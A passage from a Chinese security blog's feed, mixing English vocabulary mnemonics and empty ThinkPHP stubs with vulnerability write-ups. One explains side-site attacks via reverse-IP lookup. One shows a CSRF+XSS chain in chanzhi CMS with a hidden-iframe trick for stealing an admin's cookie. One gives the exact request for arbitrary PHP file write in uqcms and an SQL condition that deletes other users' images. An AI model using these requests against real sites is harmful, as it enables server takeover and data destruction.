title="respond"></a>respond</h3><p>中文：回答，答复<br>读音：瑞是棒的<br>句子：瑞同学回答了这个问题，所以大家都在喊瑞是棒的</p><h3 id="response"><a href="#response" class="headerlink" title="response"></a>response</h3><p>中文：响应<br>读音：瑞士胖死<br>句子：瑞士有一个人胖死了，政府没做出响应</p><h3 id="responsible"><a href="#responsible" class="headerlink" title="responsible"></a>responsible</h3><p>中文：尽责的<br>读音：瑞士胖死婆<br>句子：及时做出respond，他很尽责的</p><h3 id="correspond"><a href="#correspond" class="headerlink" title="correspond"></a>correspond</h3><p>中文：符合，通信</p><h3 id="terrible"><a href="#terrible" class="headerlink" title="terrible"></a>terrible</h3><p>中文：可怕的，糟糕的<br>读音：胎若爆<br>句子：在高速公路上，胎若爆了，就会很可怕</p><h3 id="terrify"><a href="#terrify" class="headerlink" title="terrify"></a>terrify</h3><p>中文：恐吓</p><h3 id="terror"><a href="#terror" class="headerlink" title="terror"></a>terror</h3><p>中文：恐怖<br>读音：泰罗<br>句子：程序又报错(error)了，真的是太恐怖了</p><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;&lt;p&gt;巧用技巧来学习英语，让你更快记住单词，这是一个英语词汇必备的复习文章，持续更新中~&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="英语学习" scheme="127.0.0.1/categories/%E8%8B%B1%E8%AF%AD%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="English" scheme="127.0.0.1/tags/English/"/>
    
      <category term="扩大业务必备技能" scheme="127.0.0.1/tags/%E6%89%A9%E5%A4%A7%E4%B8%9A%E5%8A%A1%E5%BF%85%E5%A4%87%E6%8A%80%E8%83%BD/"/>
    
  </entry>
  
  <entry>
    <title>[TP5]自定义配置文件</title>
    <link href="127.0.0.1/2018/06/06/TP5-%E8%87%AA%E5%AE%9A%E4%B9%89%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/"/>
    <id>127.0.0.1/2018/06/06/TP5-自定义配置文件/</id>
    <published>2018-06-06T10:10:42.000Z</published>
    <updated>2018-06-06T10:10:42.805Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;blockquote class=&quot;blockquote-center&quot;&gt;&lt;p&gt;十年寒窗无人问，一举成名天下知&lt;br&gt;                            – Cai_Team&lt;/p&gt;
&lt;/blockquote&gt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>[TP5]扩展配置目录</title>
    <link href="127.0.0.1/2018/06/06/TP5-%E6%89%A9%E5%B1%95%E9%85%8D%E7%BD%AE%E7%9B%AE%E5%BD%95/"/>
    <id>127.0.0.1/2018/06/06/TP5-扩展配置目录/</id>
    <published>2018-06-06T10:10:25.000Z</published>
    <updated>2018-06-06T10:10:25.874Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;blockquote class=&quot;blockquote-center&quot;&gt;&lt;p&gt;十年寒窗无人问，一举成名天下知&lt;br&gt;                            – Cai_Team&lt;/p&gt;
&lt;/blockquote&gt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>[TP5]配置文件格式</title>
    <link href="127.0.0.1/2018/06/06/TP5-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"/>
    <id>127.0.0.1/2018/06/06/TP5-配置文件格式/</id>
    <published>2018-06-06T10:10:12.000Z</published>
    <updated>2018-06-06T10:10:12.417Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;blockquote class=&quot;blockquote-center&quot;&gt;&lt;p&gt;十年寒窗无人问，一举成名天下知&lt;br&gt;                            – Cai_Team&lt;/p&gt;
&lt;/blockquote&gt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>TP5入口文件</title>
    <link href="127.0.0.1/2018/06/06/%5BTP5%5D%E5%85%A5%E5%8F%A3%E6%96%87%E4%BB%B6/"/>
    <id>127.0.0.1/2018/06/06/[TP5]入口文件/</id>
    <published>2018-06-06T10:08:33.000Z</published>
    <updated>2018-06-06T10:15:03.753Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;blockquote class=&quot;blockquote-center&quot;&gt;&lt;p&gt;十年寒窗无人问，一举成名天下知&lt;br&gt;                            – Cai_Team&lt;/p&gt;
&lt;/blockquote&gt;
      
    
    </summary>
    
      <category term="编程语言" scheme="127.0.0.1/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
      <category term="Web开发" scheme="127.0.0.1/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Web%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="thinkphp5框架" scheme="127.0.0.1/tags/thinkphp5%E6%A1%86%E6%9E%B6/"/>
    
      <category term="网站开发" scheme="127.0.0.1/tags/%E7%BD%91%E7%AB%99%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>旁注攻击</title>
    <link href="127.0.0.1/2018/06/05/%E6%97%81%E6%B3%A8%E6%94%BB%E5%87%BB/"/>
    <id>127.0.0.1/2018/06/05/旁注攻击/</id>
    <published>2018-06-05T15:20:08.000Z</published>
    <updated>2018-06-05T15:28:35.180Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>旁注攻击就是说在攻击目标时，对目标网站“无法下手”找不到目标网站的漏洞，那么攻击者就可以通过在与目标站点同一服务器下的站点渗透如，从而获取目标站点的权限，这过程就是旁注攻击</p></blockquote><a id="more"></a><p>简单的举个栗子，比如一个服务器有如下站点:<br><img src="http://static.zybuluo.com/1kbfree/s4019xggzf82sjiesayzxa6t/image_1cf848h6c1b4v1sflqph1dsuvee39.png" alt="image_1cf848h6c1b4v1sflqph1dsuvee39.png-29.4kB"></p><p>当攻击者在攻击<code>www.iamfree.a</code>的时候，没有发现漏洞，无法拿下此站点，那么攻击者就可以通过攻击<code>www.iamfree.b</code>并且成功攻破，得到了<code>Root</code>权限，那么这里不但<code>www.iamfree.a</code>的数据会被泄露，<code>www.iamfree.b</code>的数据也同样会被泄露，而<code>www.iamfree.c</code>网站是不会受到影响的。因为他不与<code>www.iamfree.b</code>在同一个数据库。但也不是说绝对的安全的，攻击者也可以通过数据库提权的方式获取到服务器管理员的权限，从而获取<code>Access</code>数据库里的内容。</p><p>大网站也存在有旁注攻击的风险，比如:<code>qq.com</code>，他有很多子域名，如图<br><img src="http://static.zybuluo.com/1kbfree/3ymscqzouadvamtxr9wqmksd/image_1cf87ar7nnmbtli1hkf1kk615l1p.png" alt="image_1cf87ar7nnmbtli1hkf1kk615l1p.png-98.3kB"><br>如此多的子域名，不可能说每个站点都一定是安全的，所以我们可以子域名来渗透到主域名。</p><p>那么疑问来了，攻击者怎么知道目标服务器上放置了哪些网站呢？这时候就要用到 IP逆向查询了。</p><h2 id="IP逆向查询"><a href="#IP逆向查询" class="headerlink" title="IP逆向查询"></a>IP逆向查询</h2><p>在线查询服务器下有哪些站点的网站：</p><ol><li><p><a href="https://www.yougetsignal.com/tools/web-sites-on-web-server/" target="_blank" rel="noopener">https://www.yougetsignal.com/tools/web-sites-on-web-server/</a></p><p> <img src="http://static.zybuluo.com/1kbfree/ogrcrpiw8jki4zges4vn72zt/image_1cf87suv9132qtfno5u1r45o1h19.png" alt="image_1cf87suv9132qtfno5u1r45o1h19.png-92.9kB"></p></li><li><p><a href="http://s.tool.chinaz.com/same/" target="_blank" rel="noopener">http://s.tool.chinaz.com/same/</a> </p><p> <img src="http://static.zybuluo.com/1kbfree/9yslwjvp37ru93imr1t5zudg/image_1cf882dr5bhesnp1k0vjb11vnf1m.png" alt="image_1cf882dr5bhesnp1k0vjb11vnf1m.png-70.9kB"></p></li><li><p><a href="https://dns.aizhan.com/" target="_blank" rel="noopener">https://dns.aizhan.com/</a></p><p> <img src="http://static.zybuluo.com/1kbfree/980cklf2mepmb5tjm3hiko5h/image_1cf884g691g28qut1uurvhj1dt123.png" alt="image_1cf884g691g28qut1uurvhj1dt123.png-46.8kB"></p></li><li><p>利用必应搜索引擎来IP逆向查询</p><p> <img src="http://static.zybuluo.com/1kbfree/yiiumoj9256s3tkbcirk2xmz/image_1cf88fe7b1p8e17ngah47pi7ok2g.png" alt="image_1cf88fe7b1p8e17ngah47pi7ok2g.png-133.1kB"></p></li></ol><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;旁注攻击就是说在攻击目标时，对目标网站“无法下手”找不到目标网站的漏洞，那么攻击者就可以通过在与目标站点同一服务器下的站点渗透如，从而获取目标站点的权限，这过程就是旁注攻击&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Web攻防" scheme="127.0.0.1/categories/Web%E6%94%BB%E9%98%B2/"/>
    
    
      <category term="渗透测试" scheme="127.0.0.1/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="旁站攻击" scheme="127.0.0.1/tags/%E6%97%81%E7%AB%99%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>对chanzhi企业门户系统的一次测试</title>
    <link href="127.0.0.1/2018/06/04/%E5%AF%B9chanzhi%E4%BC%81%E4%B8%9A%E9%97%A8%E6%88%B7%E7%B3%BB%E7%BB%9F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B5%8B%E8%AF%95/"/>
    <id>127.0.0.1/2018/06/04/对chanzhi企业门户系统的一次测试/</id>
    <published>2018-06-04T14:19:37.000Z</published>
    <updated>2018-06-04T14:28:49.666Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>系统官网:<a href="http://www.chanzhi.org/?v=7.0.1" target="_blank" rel="noopener">http://www.chanzhi.org/?v=7.0.1</a><br>安装步骤之类的就省去了，直接开始测试</p></blockquote><a id="more"></a><h2 id="Csrf-Xss漏洞"><a href="#Csrf-Xss漏洞" class="headerlink" title="Csrf+Xss漏洞"></a>Csrf+Xss漏洞</h2><h3 id="漏洞复现过程："><a href="#漏洞复现过程：" class="headerlink" title="漏洞复现过程："></a>漏洞复现过程：</h3><p><strong>漏洞处:后台-&gt;内容-&gt;维护目录( <code>www.yousite.xxx/www/admin.php?m=tree&amp;f=browse&amp;type=article</code> )</strong><br><img src="http://static.zybuluo.com/1kbfree/1eqczzj0lmvp5bx7cuytacx7/image_1cf22p9ph1h001c11c48en41udv9.png" alt="image_1cf22p9ph1h001c11c48en41udv9.png-88kB"></p><h3 id="尝试输入一些恶意代码"><a href="#尝试输入一些恶意代码" class="headerlink" title="尝试输入一些恶意代码:"></a>尝试输入一些恶意代码:</h3><p><img src="http://static.zybuluo.com/1kbfree/9jkepe0movhb3wqnogdp3q72/image_1cf22sib1r2s1gmr1ef91jdobl3m.png" alt="image_1cf22sib1r2s1gmr1ef91jdobl3m.png-94kB"><br><em>这里因为发现没有过滤，所以存在Xss漏洞，但是这里我们是不可能插入的(除非管理员自己插入的，那么，我们就来看看有没有Csrf漏洞可以结合一下)，然后就想着用<code>Burp</code>抓包分析一下，发现有戏~</em></p><h3 id="用Burp抓包分析一波，并且放入Repeater模块"><a href="#用Burp抓包分析一波，并且放入Repeater模块" class="headerlink" title="用Burp抓包分析一波，并且放入Repeater模块"></a>用Burp抓包分析一波，并且放入Repeater模块</h3><p><img src="http://static.zybuluo.com/1kbfree/kamwo6vjibi723vy6xsftfpj/image_1cf234ih41j9j13q81fui1vt61e4613.png" alt="image_1cf234ih41j9j13q81fui1vt61e4613.png-179.2kB"><br><em>这里并没有发现有<code>Token</code>验证，那么我们来利用<code>Burp</code>自带的生成<code>Csrf Poc</code></em></p><ol><li><p>右键-&gt;Engagement tools-&gt;Generate Csrf PoC<br> <img src="http://static.zybuluo.com/1kbfree/spy3dawa6wefouk801yjbmmy/image_1cf238hq59dd17s81hmc19fo17de1g.png" alt="image_1cf238hq59dd17s81hmc19fo17de1g.png-200.7kB"></p></li><li><p>自动写出PoC，我们直接复制到本地的HTML文件里<br> <img src="http://static.zybuluo.com/1kbfree/z77f48e487ibum2kzqzgtbyg/image_1cf23afcu47711rc1f8dda51td81t.png" alt="image_1cf23afcu47711rc1f8dda51td81t.png-130.6kB"><br> <img src="http://static.zybuluo.com/1kbfree/ia6pgpvoujwmaiubnvr32dac/image_1cf23be0010jv2trk20h981fa32a.png" alt="image_1cf23be0010jv2trk20h981fa32a.png-166.1kB"></p></li><li><p>在浏览器中打开这个生成的PoC<br> <img src="http://static.zybuluo.com/1kbfree/bi0vt6ds8xk4tjja26jatavc/image_1cf23jr1ahr71q7oh512dkthq51.png" alt="image_1cf23jr1ahr71q7oh512dkthq51.png-32.9kB"><br> <img src="http://static.zybuluo.com/1kbfree/akzoa6mwnynhh9alfkz5z27d/image_1cf23er16or4g0a18gh18ap7a22n.png" alt="image_1cf23er16or4g0a18gh18ap7a22n.png-78.5kB"><br> <img src="http://static.zybuluo.com/1kbfree/zodoc27hx19hevz7zi2yu7yz/image_1cf23lrb4153tkd2123m1v988p85e.png" alt="image_1cf23lrb4153tkd2123m1v988p85e.png-81.4kB"><br> <em>ok，存在Csrf漏洞</em></p></li></ol><blockquote class="blockquote-center"><p>我们可以利用社工来把这个文件发送给管理员，如果管理员选择了打开的话那么就可以盗取他的Cookie了，那么很多人会问，管理员看到这样的界面肯定会不点击啦，那么我给你一个思路，就是把csrf_poc的代码放在 1.html 文件( 把点击提交修改为自动提交 )，然后把2.html文件用 iframe标签把 1.html 文件嵌入 并且把iframe标签透明度设置为100%，那么管理员打开后就会自动提交表单并且不会展示在2.html页面上~~~</p></blockquote><hr><blockquote><p>本来还想写另一个漏洞的，可惜无法绕过，实属能力有限</p></blockquote><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;&lt;p&gt;系统官网:&lt;a href=&quot;http://www.chanzhi.org/?v=7.0.1&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.chanzhi.org/?v=7.0.1&lt;/a&gt;&lt;br&gt;安装步骤之类的就省去了，直接开始测试&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Web攻防" scheme="127.0.0.1/categories/Web%E6%94%BB%E9%98%B2/"/>
    
    
      <category term="代码审计" scheme="127.0.0.1/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="渗透测试" scheme="127.0.0.1/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="Xss" scheme="127.0.0.1/tags/Xss/"/>
    
      <category term="Csrf" scheme="127.0.0.1/tags/Csrf/"/>
    
  </entry>
  
  <entry>
    <title>uqcms的后台GetShell和前台越权删除他人图片</title>
    <link href="127.0.0.1/2018/06/03/uqcms%E7%9A%84%E5%90%8E%E5%8F%B0GetShell%E5%92%8C%E5%89%8D%E5%8F%B0%E8%B6%8A%E6%9D%83%E5%88%A0%E9%99%A4%E4%BB%96%E4%BA%BA%E5%9B%BE%E7%89%87/"/>
    <id>127.0.0.1/2018/06/03/uqcms的后台GetShell和前台越权删除他人图片/</id>
    <published>2018-06-03T04:06:17.000Z</published>
    <updated>2018-06-03T04:25:27.623Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>qucms是一个B2B2C多商户电商系统 </p><p>结合多年的电商开发经验推出B2B2C多店铺系统，是目前国内最优秀的电商平台之一，系统设计为“平台自营+供应商入驻”的电商运营模式，系统支持佣金结算、区域团购、实时物流、售后服务等基础功能；为电商运营商提供最优质的系统和服务。 该程序采用非常流行的PHP作为开发语言，给很多广大开发者一个容易上手，能快速进入业务，成熟的语言架构，去除无用直达高效的设计，给企业快速开发，赢的市场。</p></blockquote><a id="more"></a><h2 id="1-后台GETSHELL"><a href="#1-后台GETSHELL" class="headerlink" title="1. 后台GETSHELL"></a>1. 后台GETSHELL</h2><p><strong>打开URL<code>www.yousite.xxx?m=template</code>后，呈现这个页面:</strong><br><img src="http://static.zybuluo.com/1kbfree/5rhe8dglshi1f6zo2a6zcx30/image_1cevu8mj382u1blhvnl1eqk1nri9.png" alt="image_1cevu8mj382u1blhvnl1eqk1nri9.png-43.8kB"><br><em>点击进入目录</em></p><p><img src="http://static.zybuluo.com/1kbfree/m3qpdsjbtli4b0yuvfagnca7/image_1cevua1je1t93pa7cfj127jhv16.png" alt="image_1cevua1je1t93pa7cfj127jhv16.png-95.5kB"><br><em>随便点击一个编辑，然后用<code>Burp</code>抓包( 用不用都可以 )</em></p><p><img src="http://static.zybuluo.com/1kbfree/skmc2jt9ydxst5v8qx5lxvp3/image_1cevuf2drd8t1l1e56evn31otg1j.png" alt="image_1cevuf2drd8t1l1e56evn31otg1j.png-106.9kB"><br><em>单击提交后用<code>Burp</code>抓包，抓到的数据如下图</em></p><p><img src="http://static.zybuluo.com/1kbfree/q1zt5b9wfa8pzw3ulz1xo01v/image_1cevuh0soqt1imm1icg43m13h820.png" alt="image_1cevuh0soqt1imm1icg43m13h820.png-173.1kB"><br><em>我们将<code>filename</code>修改为<code>phpinfo.php</code>，把<code>content</code>修改为<code>&lt;?php phpinfo();?&gt;</code></em></p><p><img src="http://static.zybuluo.com/1kbfree/9nm6cx6hllfsnm3jxnfax44k/image_1cevuk0f31pddmhhphu1urj1nvn2d.png" alt="image_1cevuk0f31pddmhhphu1urj1nvn2d.png-52.6kB"></p><p><strong>修改后的数据包:</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /admin.php?m=template&amp;a=save&amp;jq_time=1527933067821 HTTP/1.1</span><br><span class="line">Host: www.iamfree.ccc</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Referer: http://www.iamfree.ccc/admin.php?m=template&amp;a=edit&amp;path=default.top.html</span><br><span class="line">Content-Length: 2886</span><br><span class="line">Cookie: PHPSESSID=b3uto19lpaa0mbbg4rudn9oqt0; goods[cart]=180602173948571025</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">filename=phpinfo.php&amp;content=&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure></p><p>然后就会在根目录创建一个名为<code>phpinfo.php</code>的文件，并且内容为<code>&lt;?php phpinfo();?&gt;</code><br><img src="http://static.zybuluo.com/1kbfree/mhq7mmwnvatnrtklvuaojrp3/image_1cevur2sr1nri103u1pss15mf19l92q.png" alt="image_1cevur2sr1nri103u1pss15mf19l92q.png-80.8kB"></p><p><strong>访问<code>phpinfo.php</code>文件，完成GETSHELL</strong>:<br><img src="http://static.zybuluo.com/1kbfree/hs1ow8zedgcsb9tky3sgqsv8/image_1cevuscb0g0i1ccj146918t61n9837.png" alt="image_1cevuscb0g0i1ccj146918t61n9837.png-75.1kB"></p><h3 id="漏洞代码处："><a href="#漏洞代码处：" class="headerlink" title="漏洞代码处："></a>漏洞代码处：</h3><p><img src="http://static.zybuluo.com/1kbfree/z49nss7cfztsupiae1uwdb9j/image_1cevvbsg4vo29pi19jcmst1ftd3k.png" alt="image_1cevvbsg4vo29pi19jcmst1ftd3k.png-147kB"><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($_POST) &#123;</span><br><span class="line">            $file = P(<span class="string">'filename'</span>, <span class="string">'修改的文件名不能为空'</span>);</span><br><span class="line">            $content = P(<span class="string">'content'</span>);</span><br><span class="line">            $query = file_put_contents($file, stripslashes_deep($content)); </span><br><span class="line">            <span class="keyword">if</span> ($query) &#123;</span><br><span class="line">                right_json();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                error_json(<span class="string">'保存失败'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            error_json(<span class="string">'提交错误'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><h4 id="加上这三段代码，便于调试"><a href="#加上这三段代码，便于调试" class="headerlink" title="加上这三段代码，便于调试"></a>加上这三段代码，便于调试</h4><p><img src="http://static.zybuluo.com/1kbfree/qa4imhcw08688ryzb25skm9x/image_1cevvi0dl17hnhst1nns4j91n3m4h.png" alt="image_1cevvi0dl17hnhst1nns4j91n3m4h.png-47.8kB"></p><h4 id="把Burp抓的包放到Repeater-按住ctrl-r-模块里"><a href="#把Burp抓的包放到Repeater-按住ctrl-r-模块里" class="headerlink" title="把Burp抓的包放到Repeater( 按住ctrl+r )模块里"></a>把<code>Burp</code>抓的包放到<code>Repeater</code>( 按住ctrl+r )模块里</h4><p><img src="http://static.zybuluo.com/1kbfree/m9ajlrc4vc6w6v36utocmlpm/image_1cevvkj3gt54godvddo68q434u.png" alt="image_1cevvkj3gt54godvddo68q434u.png-82.5kB"><br><em><code>file_put_contents</code></em>的返回值是第二个参数的长度</p><p><em>这里因为没有做任何过滤，所以这里导致了任意文件写入漏洞</em></p><h2 id="前台任意删除他人图片"><a href="#前台任意删除他人图片" class="headerlink" title="前台任意删除他人图片:"></a>前台任意删除他人图片:</h2><h3 id="漏洞处"><a href="#漏洞处" class="headerlink" title="漏洞处:"></a>漏洞处:</h3><ol><li><p>进入商家登陆<br><img src="http://static.zybuluo.com/1kbfree/3j8beyrhld9vq3fyv0pnmf3z/image_1cf0ctl1g1rj513371i61v5k5bv9.png" alt="image_1cf0ctl1g1rj513371i61v5k5bv9.png-482.6kB"></p></li><li><p>登陆后，单击装修<br><img src="http://static.zybuluo.com/1kbfree/5d2bkrbuyrblhiloj4yqhl8r/image_1cf0cuvu7f2225011akh3n6egm.png" alt="image_1cf0cuvu7f2225011akh3n6egm.png-40.9kB"></p></li><li><p>点击相册列表，并且上传图片<br><img src="http://static.zybuluo.com/1kbfree/6gml7d0kw30alawf5a3vixo0/image_1cf0d0f9r10p21rrm14pk576i213.png" alt="image_1cf0d0f9r10p21rrm14pk576i213.png-56.5kB"></p></li></ol><h3 id="漏洞讲解开始"><a href="#漏洞讲解开始" class="headerlink" title="漏洞讲解开始"></a>漏洞讲解开始</h3><p><strong>首先选择这个ID为<code>1566</code>的那张图片点击删除，并且用<code>Burp</code>进行抓包:</strong><br><img src="http://static.zybuluo.com/1kbfree/p0q1340u6cna6wtqcehdvrdm/image_1cf0d48umhlifkd10g9poj17vf20.png" alt="image_1cf0d48umhlifkd10g9poj17vf20.png-73.2kB"></p><p><strong>我们首先随便输入一下错误的语法( 方便看到他的执行了什么语句 ):</strong><br><img src="http://static.zybuluo.com/1kbfree/vs6qmp1rqhgtwtxujf008arj/image_1cf0d6kkfr7518cvk5lm1t1bja2d.png" alt="image_1cf0d6kkfr7518cvk5lm1t1bja2d.png-80kB"></p><p>可以看到他执行的SQL语句是:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,shop_id,<span class="keyword">url</span> <span class="keyword">from</span> uq_album <span class="keyword">where</span> shop_id = <span class="number">4</span> <span class="keyword">and</span> <span class="keyword">id</span> = <span class="number">1566</span> <span class="keyword">or</span> xxxx #查询uq_album表中条件为shop_id=<span class="number">4</span>与<span class="keyword">id</span>=<span class="number">1566</span>的<span class="keyword">id</span>和shop_id和<span class="keyword">url</span></span><br></pre></td></tr></table></figure></p><p><img src="http://static.zybuluo.com/1kbfree/07cx81dknqfgq9z6nlp53bpk/image_1cf0e57anq5rjs1131tj431m6u2q.png" alt="image_1cf0e57anq5rjs1131tj431m6u2q.png-81.6kB"></p><p>我们现在身为<code>test2</code>想把<code>test1</code>的图片删了，那么我们就构造一下sql语句~</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,shop_id,<span class="keyword">url</span> <span class="keyword">from</span> uq_album <span class="keyword">where</span> shop_id = <span class="number">4</span> <span class="keyword">and</span> <span class="keyword">id</span> = <span class="number">1566</span> <span class="keyword">or</span> shop_id <span class="keyword">in</span> (<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p><img src="http://static.zybuluo.com/1kbfree/0smw4ibe5qo15yet4wb62hv5/image_1cf0ea13g1oag25u1st01dsk1oob37.png" alt="image_1cf0ea13g1oag25u1st01dsk1oob37.png-19.6kB"></p><p><em>可以看见这里有3条数据被展现出来了，也就是<code>test2</code>上传的图片</em><br><img src="http://static.zybuluo.com/1kbfree/z88pbselrnp64czvlxvzvz52/image_1cf0ehv65i57hfmpth1qdjct3k.png" alt="image_1cf0ehv65i57hfmpth1qdjct3k.png-84kB"></p><p><strong>然后我们开始执行一下这个构造的<code>SQL</code>语句:</strong><br><img src="http://static.zybuluo.com/1kbfree/mlqrnissvouj49pwufitq5ak/image_1cf0em241145v1nd7lg11femt0a41.png" alt="image_1cf0em241145v1nd7lg11femt0a41.png-77.6kB"></p><p><strong>然后我们发现那3条数据就没了:</strong><br><img src="http://static.zybuluo.com/1kbfree/yjcup6bc7ouudlnnpd1tb9bl/image_1cf0emvus1lq91rm6fls17jpfq04u.png" alt="image_1cf0emvus1lq91rm6fls17jpfq04u.png-41.6kB"></p><h3 id="代码处"><a href="#代码处" class="headerlink" title="代码处:"></a>代码处:</h3><blockquote><p>下次补 手机已经扣了4元了 出不起了 </p></blockquote><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;&lt;p&gt;qucms是一个B2B2C多商户电商系统 &lt;/p&gt;
&lt;p&gt;结合多年的电商开发经验推出B2B2C多店铺系统，是目前国内最优秀的电商平台之一，系统设计为“平台自营+供应商入驻”的电商运营模式，系统支持佣金结算、区域团购、实时物流、售后服务等基础功能；为电商运营商提供最优质的系统和服务。 该程序采用非常流行的PHP作为开发语言，给很多广大开发者一个容易上手，能快速进入业务，成熟的语言架构，去除无用直达高效的设计，给企业快速开发，赢的市场。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Web攻防" scheme="127.0.0.1/categories/Web%E6%94%BB%E9%98%B2/"/>
    
    
      <category term="代码审计" scheme="127.0.0.1/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="0day" scheme="127.0.0.1/tags/0day/"/>
    
      <category term="Cms漏洞挖掘" scheme="127.0.0.1/tags/Cms%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
      <category term="白盒审计" scheme="127.0.0.1/tags/%E7%99%BD%E7%9B%92%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>OSI七层模型</title>
    <link href="127.0.0.1/2018/05/27/OSI%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B/"/>
    <id>127.0.0.1/2018/05/27/OSI七层模型/</id>
    <published>2018-05-27T09:58:26.000Z</published>
    <updated>2018-05-27T10:02:08.000Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
